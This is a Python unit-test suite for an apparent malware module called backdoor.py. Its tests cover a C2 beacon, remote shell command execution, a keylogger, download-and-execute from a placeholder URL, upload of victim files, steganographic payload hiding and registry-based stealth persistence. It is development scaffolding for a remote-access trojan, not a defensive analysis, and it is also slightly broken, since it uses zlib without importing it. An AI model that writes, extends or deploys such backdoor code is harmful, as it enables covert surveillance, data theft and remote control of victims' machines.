"""
Unit Tests for backdoor.py
Rigorous testing with edge cases, mocking of external dependencies (socket, subprocess, etc.),
and coverage of core functions.
"""

import unittest
from unittest.mock import patch, MagicMock, mock_open, call
import os
import socket
import base64
import threading
import time
import sys
import platform
import getpass
import subprocess

# Import the backdoor module (adjust path if needed)
import backdoor  


# These tests are designed to be run in an isolated environment and may require adjustments based on the actual implementation of backdoor.py.
class TestBackdoor(unittest.TestCase):


  # Reset global variables before each test
  def setUp(self):
    backdoor.keyBuffer = ""
    backdoor.loggerIsRunning = False
    backdoor.glbSock = None


  # Test the send_beacon function to ensure it sends the correct beacon string based on system information.
  @patch('backdoor.platform')
  @patch('backdoor.getpass')
  @patch('backdoor.os')
  def test_send_beacon(self, mock_os, mock_getpass, mock_platform):
    mock_platform.node.return_value = "testpc"
    mock_getpass.getuser.return_value = "testuser"
    mock_os.name = "testOS"
    mock_platform.system.return_value = "Windows"

    mock_sock = MagicMock()
    backdoor.send_beacon(mock_sock)

    expected = "BKDR_ALIVE|testpc|testuser|ADMIN|Windows"
    mock_sock.send.assert_called_once_with(expected.encode("utf-8"))

  # Test directory change command.
  def test_execute_command_cd(self):
    mock_sock = MagicMock()
    with patch('backdoor.os.chdir') as mock_chdir, \
      patch('backdoor.os.getcwd') as mock_getcwd:
      mock_getcwd.return_value = "/new/dir"
      backdoor.execute_command("cd /new/dir", mock_sock)

    mock_chdir.assert_called_once_with("/new/dir")
    mock_sock.send.assert_called_once()
    sent = mock_sock.send.call_args[0][0]
    self.assertIn(b"CMD_RES|", sent)


  # Test normal shell command execution (Windows path)
  @patch('backdoor.subprocess.run')
  
  def test_execute_command_shell(self, mock_run):
    mock_sock = MagicMock()
    mock_result = MagicMock()
    mock_result.stdout = "dir output"
    mock_result.stderr = ""
    mock_run.return_value = mock_result
    backdoor.os.name = "nt"

    backdoor.execute_command("dir", mock_sock)

    mock_run.assert_called_once()
    mock_sock.send.assert_called_once()
    sent = mock_sock.send.call_args[0][0]
    self.assertIn(b"CMD_RES|", sent)

  # Test timeout handling
  def test_execute_command_timeout(self):
      mock_sock = MagicMock()
      with patch('backdoor.subprocess.run') as mock_run:
          mock_run.side_effect = subprocess.TimeoutExpired("cmd", 15)
          backdoor.execute_command("sleep 30", mock_sock)

      mock_sock.send.assert_called_once()
      sent = mock_sock.send.call_args[0][0]
      self.assertIn(b"CMD_ERR|Command timed out", sent)




  # Test keylogger on_press logic
  def test_on_press_char_and_special(self):
    backdoor.loggerIsRunning = True
    backdoor.keyBuffer = ""
    backdoor.glbSock = MagicMock()
    # Simulate normal char
    class Key:
      char = 'a'
    backdoor.on_press(Key())
    self.assertIn('a', backdoor.keyBuffer)
    # Simulate special key
    class SpecialKey:
      char = None
    key = SpecialKey()
    setattr(key, '__str__', lambda self: 'Key.space')
    backdoor.on_press(key)
    self.assertIn('[SP:', backdoor.keyBuffer)

  # Test download_execute (success and error)
  @patch('backdoor.urllib.request.urlretrieve')
  @patch('backdoor.subprocess.Popen')
  def test_download_execute(self, mock_popen, mock_urlretrieve):
    mock_sock = MagicMock()
    # Download only
    backdoor.download_execute('http://test/file.txt', mock_sock)
    mock_urlretrieve.assert_called_once()
    mock_sock.send.assert_any_call(b'FILE_OK|Downloaded: file.txt')
    # Download and execute
    mock_urlretrieve.reset_mock()
    mock_sock.reset_mock()
    backdoor.download_execute('http://test/file.exe -e', mock_sock)
    mock_urlretrieve.assert_called_once()
    mock_popen.assert_called_once()
    mock_sock.send.assert_any_call(b'EXEC_OK|File executed: file.exe')

  @patch('backdoor.urllib.request.urlretrieve', side_effect=Exception('fail'))
  def test_download_execute_error(self, mock_urlretrieve):
    mock_sock = MagicMock()
    backdoor.download_execute('http://fail/file.txt', mock_sock)
    mock_sock.send.assert_any_call(b'FILE_ERR|Download failed: fail')

  # Test upload_file (success and file not found)
  @patch('backdoor.os.path.exists', return_value=True)
  @patch('builtins.open', new_callable=mock_open, read_data='data')
  def test_upload_file_success(self, mock_file, mock_exists):
    mock_sock = MagicMock()
    backdoor.upload_file('file.txt', mock_sock)
    mock_sock.send.assert_any_call(b'UPLOAD_DATA|file.txt|4|data')

  @patch('backdoor.os.path.exists', return_value=False)
  def test_upload_file_not_found(self, mock_exists):
    mock_sock = MagicMock()
    backdoor.upload_file('nofile.txt', mock_sock)
    mock_sock.send.assert_any_call(b'UPLOAD_ERR|File not found: nofile.txt')

  # Test hide_file_in_image (success and too small)
  @patch('backdoor.Image.open')
  @patch('backdoor.np.array')
  @patch('builtins.open', new_callable=mock_open, read_data=b'data')
  def test_hide_file_in_image_success(self, mock_file, mock_np_array, mock_img_open):
    # Setup fake image array with enough capacity
    arr = MagicMock()
    arr.shape = (10, 10, 3)
    mock_np_array.return_value = arr
    img = MagicMock()
    mock_img_open.return_value = img
    arr.__getitem__.side_effect = lambda idx: [0,0,0]
    arr.__setitem__ = lambda idx, val: None
    with patch('backdoor.Image.fromarray') as mock_fromarray:
      mock_fromarray.return_value.save = MagicMock()
      result = backdoor.hide_file_in_image('payload', 'carrier', 'output')
      self.assertTrue(result)

  @patch('backdoor.Image.open')
  @patch('backdoor.np.array')
  @patch('builtins.open', new_callable=mock_open, read_data=b'data')
  def test_hide_file_in_image_too_small(self, mock_file, mock_np_array, mock_img_open):
    arr = MagicMock()
    arr.shape = (1, 1, 3)  # Not enough capacity
    mock_np_array.return_value = arr
    img = MagicMock()
    mock_img_open.return_value = img
    with patch('backdoor.Image.fromarray') as mock_fromarray:
      result = backdoor.hide_file_in_image('payload', 'carrier', 'output')
      self.assertFalse(result)

  # Test extract_from_image (success and error)
  @patch('backdoor.Image.open')
  @patch('backdoor.np.array')
  @patch('builtins.open', new_callable=mock_open)
  def test_extract_from_image_success(self, mock_file, mock_np_array, mock_img_open):
    # Simulate image with a valid payload and end marker
    arr = MagicMock()
    arr.shape = (1, 100, 3)
    # Build a binary string with a valid compressed payload and end marker
    payload = b'data'
    compressed = zlib.compress(payload, level=9)
    to_hide = len(compressed).to_bytes(4, 'big') + compressed + b'###END###'
    binary = ''.join(format(byte, '08b') for byte in to_hide)
    bits = [int(b) for b in binary] + [0]*(arr.shape[1]*3 - len(binary))
    def getitem(idx):
      i, j, k = idx
      return bits[j*3 + k] if j*3 + k < len(bits) else 0
    arr.__getitem__.side_effect = getitem
    mock_np_array.return_value = arr
    img = MagicMock()
    mock_img_open.return_value = img
    result = backdoor.extract_from_image('img', 'out.exe', False)
    self.assertEqual(result, 'out.exe')

  @patch('backdoor.Image.open', side_effect=Exception('fail'))
  def test_extract_from_image_error(self, mock_img_open):
    result = backdoor.extract_from_image('img', 'out.exe', False)
    self.assertIsNone(result)

  # Test deploy_stealth (just check it runs and calls sub-functions)
  @patch('backdoor.shutil.copy2')
  @patch('backdoor.os.makedirs')
  @patch('backdoor.os.path.abspath', side_effect=lambda x: x)
  @patch('backdoor.hide_file_in_image', return_value=True)
  @patch('backdoor.reg.OpenKey')
  @patch('backdoor.reg.SetValueEx')
  @patch('backdoor.reg.CloseKey')
  def test_deploy_stealth(self, mock_close, mock_set, mock_open, mock_hide, mock_abspath, mock_makedirs, mock_copy2):
    mock_sock = MagicMock()
    backdoor.deploy_stealth('new.exe', 'C:/target', 'carrier.png', mock_sock)
    mock_copy2.assert_called_once()
    mock_hide.assert_called_once()
    mock_sock.send.assert_any_call(
      unittest.mock.ANY  # Accept any bytes, just check it sends
    )

if __name__ == '__main__':
  unittest.main(verbosity=2)

